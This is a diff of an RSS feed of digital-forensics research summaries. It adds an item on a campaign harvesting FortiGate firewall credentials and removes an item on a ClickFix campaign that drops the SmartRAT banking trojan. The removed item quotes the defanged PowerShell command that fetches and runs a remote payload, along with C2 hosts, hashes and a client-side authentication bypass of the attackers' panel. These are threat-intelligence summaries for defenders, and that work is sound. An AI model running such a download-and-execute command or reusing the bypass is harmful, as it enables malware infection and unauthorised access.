@@ -5,8 +5,31 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.</description>
     <language>en</language>
-    <lastBuildDate>Tue, 23 Jun 2026 23:02:13 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 24 Jun 2026 01:05:13 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Inside FortiBleed: Reverse Engineering the CyberStrike Harvester Behind a Global FortiGate Credential Factory</title>
+      <link>https://arcticwolf.com/resources/blog/inside-fortibleed-reverse-engineering-the-cyberstrike-harvester-behind-a-global-fortigate-credential-factory/</link>
+      <description>FortiBleed campaign runs a credential factory against internet-facing FortiGate firewalls globally, combining stuffing, spraying, config harvesting, and offline cracking into a fully automated pipeline.
+
+Key findings:
+
+- No malware payload is dropped. The attacker's tool, CyberStrike Harvester, is an automated pipeline that performs credential stuffing and password spraying against FortiGate SSL VPN portals, harvests full device configurations post-authentication, then cracks offline to extract additional credentials. The attack leaves minimal host-side artifacts.
+
+- Configuration harvesting is the critical pivot. Once any credential authenticates, the tool pulls the full FortiGate config, which contains hashed local user passwords, LDAP bind credentials, and IPsec PSKs. Offline cracking turns one valid login into many, expanding access far beyond the initial foothold.
+
+- Because the pipeline is authentication-based, traditional network-layer detections may miss it. Evidence lives in FortiGate auth logs, VPN session logs, and API access records. Look for high-volume login attempts followed by config-export API calls from unexpected source IPs.
+
+- Scope is global and targets internet-exposed management and SSL VPN interfaces, making any unpatched or weakly-credentialed FortiGate a candidate target.
+
+Audit FortiGate auth logs for config-export API calls (specifically /api/v2/monitor and backup endpoints) shortly after successful logins.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2069587611631427927</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2069587611631427927">DFIR Radar</source>
+      <pubDate>Wed, 24 Jun 2026 01:05:13 +0000</pubDate>
+      <guid isPermaLink="false">2069587611631427927</guid>
+    </item>
     <item>
       <title>Agent Tesla Malware Analysis: How This .NET RAT Steals Your Data</title>
       <link>https://www.picussecurity.com/resource/blog/agent-tesla-malware-analysis-how-this-.net-rat-steals-your-data</link>
@@ -1495,23 +1518,6 @@ Practitioner takeaway: prioritise the App.MenuItem Biome stream in any macOS Tah
       <source url="https://x.com/DFIR_Radar/status/2067321927560270261">DFIR Radar</source>
       <pubDate>Wed, 17 Jun 2026 19:02:11 +0000</pubDate>
       <guid isPermaLink="false">2067321927560270261</guid>
-    </item>
-    <item>
-      <title>ClickFix Campaign Generated Via AI Delivers SmartRAT</title>
-      <link>https://www.zscaler.com/blogs/security-research/clickfix-campaign-generated-ai-delivers-smartrat</link>
-      <description>AI-generated ClickFix lure impersonates a Brazilian 🇧🇷 bank to drop SmartRAT, a PowerShell banking RAT with QR-swap, keylogging, and fake overlay capabilities. The C2 panel had no server-side auth.
-
-Key findings:
-- Full infection chain: typosquatting domain cartaobb[.]com mimics cartaobrb[.]com[.]br, fake Cloudflare CAPTCHA triggers clipboard injection, fake BSOD locks the browser, then victim pastes: powershell "$k8='hxxp://64[.]95[.]13[.]238/st.txt';iex(irm $k8)" into Run. Three-stage PowerShell dropper pulls payload[.]php, AES-CBC decrypts SmartRAT in memory. Hashes: st.txt 297eb45f028d44d750297d2f932b9c91, RAT b17ccdb5531555e43f082d6e77c07227.
-- SmartRAT (SMART_V25) persists as scheduled task or Windows service named MicrosoftEdgeUpdateCore (T1543.003), copies itself to %APPDATA%\Microsoft\Diagnosis\ETW\msedgeupdate.txt, logs all activity to C:\ProgramData\Microsoft\Diagnosis\ETW\client_debug.log and per-PID logs.
-- C2 at c[.]windowsupdate-cdn[.]com port 51888 (fallback 162[.]141[.]111[.]227), AES-CBC encrypted over raw TCP. QR-swap feature overlays attacker QR at exact pixel coordinates of the legitimate banking QR to redirect transactions. Monitors window titles for santander, bradesco, itau, nubank, binance, and a dozen more.
-- The C2 panel (branded MyGood PRO) bypasses auth by checking only localStorage values authToken and currentUser client-side with no server validation, exposing the full admin panel to anyone who sets those keys.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2067307026502606999</description>
-      <category>MALWARE ANALYSIS</category>
-      <source url="https://x.com/DFIR_Radar/status/2067307026502606999">DFIR Radar</source>
-      <pubDate>Wed, 17 Jun 2026 18:02:59 +0000</pubDate>
-      <guid isPermaLink="false">2067307026502606999</guid>
     </item>
   </channel>
 </rss>
